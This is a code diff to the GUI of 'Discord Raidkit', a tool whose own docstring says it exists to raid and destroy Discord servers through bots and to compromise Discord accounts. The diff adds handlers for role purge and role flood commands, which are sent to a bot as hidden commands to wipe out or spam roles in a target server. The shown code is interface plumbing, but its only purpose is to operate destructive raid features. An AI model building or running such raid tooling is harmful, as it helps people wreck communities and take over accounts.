@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.5.3 by the-cult-of-integral
+Discord Raidkit v2.5.4 by the-cult-of-integral
 
 An open-source, forever free tool that allows you to raid and destroy 
 Discord servers via Discord bots,  compromise Discord accounts, and 
@@ -17,12 +17,11 @@ For this reason, you accept responsibility for any action caused.
 Use at your own risk.
 """
 
-import os
 import time
 import sys
 import webbrowser
 
-from PyQt6 import QtCore, QtWidgets, QtGui
+from PyQt6 import QtWidgets, QtGui
 from qt.MainWindow import Ui_MainWindow
 from qt.NewBotStatus import Ui_dlgNewBotStatus
 from qt.NewBotPresenceStatus import Ui_DlgNewBotPresenceStatus
@@ -32,6 +31,8 @@ from qt.InvokeSpamArgs import Ui_dlgInvokeSpamArgs
 from qt.InvokeNewWebhookArgs import Ui_dlgInvokeNewWebhookArgs
 from qt.InvokeCPurge import Ui_dlgInvokeCPurge
 from qt.InvokeCFloodArgs import Ui_dlgInvokeCFloodArgs
+from qt.InvokeRPurge import Ui_dlgInvokeRPurge
+from qt.InvokeRFloodArgs import Ui_dlgInvokeRFloodArgs
 from qt.InvokeAdminArgs import Ui_dlgInvokeAdminArgs
 from qt.InvokeRaidArgs import Ui_dlgInvokeRaidArgs
 from qt.InvokeNukeArgs import Ui_dlgInvokeNukeArgs
@@ -100,6 +101,8 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
         self.btnInvokeNewWebhook.clicked.connect(self.horus_invoke_new_webhook)
         self.btnInvokeCPurge.clicked.connect(self.horus_invoke_cpurge)
         self.btnInvokeCFlood.clicked.connect(self.horus_invoke_cflood)
+        self.btnInvokeRolePurge.clicked.connect(self.horus_invoke_rpurge)
+        self.btnInvokeRoleFlood.clicked.connect(self.horus_invoke_rflood)
         self.btnInvokeAdmin.clicked.connect(self.horus_invoke_admin)
         self.btnInvokeRaid.clicked.connect(self.horus_invoke_raid)
         self.btnInvokeNuke.clicked.connect(self.horus_invoke_nuke)
@@ -312,6 +315,31 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
             name = dialog_ui.leName.text().strip()
             if name:
                 self.horus_thread.invoke_command(EH_HiddenCommands.CFLOOD.value, guild_id=guild_id, amount=amount, name=name)
+            else:
+                self.append_hterminal('Error: Invalid Name Provided.')
+    
+    def horus_invoke_rpurge(self):
+        dialog = QtWidgets.QDialog()
+        dialog_ui = Ui_dlgInvokeRPurge()
+        dialog_ui.setupUi(dialog)
+        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
+            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
+            if not guild_id:
+                return
+            self.horus_thread.invoke_command(EH_HiddenCommands.RPURGE.value, guild_id=guild_id)
+
+    def horus_invoke_rflood(self):
+        dialog = QtWidgets.QDialog()
+        dialog_ui = Ui_dlgInvokeRFloodArgs()
+        dialog_ui.setupUi(dialog)
+        if dialog.exec() == QtWidgets.QDialog.DialogCode.Accepted:
+            guild_id = self.__convert_to_int(self.leGuildID.text().strip(), 'Error: Invalid Guild ID Provided.')
+            if not guild_id:
+                return
+            amount = dialog_ui.sbAmount.value()
+            name = dialog_ui.leName.text().strip()
+            if name:
+                self.horus_thread.invoke_command(EH_HiddenCommands.RFLOOD.value, guild_id=guild_id, amount=amount, name=name)
             else:
                 self.append_hterminal('Error: Invalid Name Provided.')
 
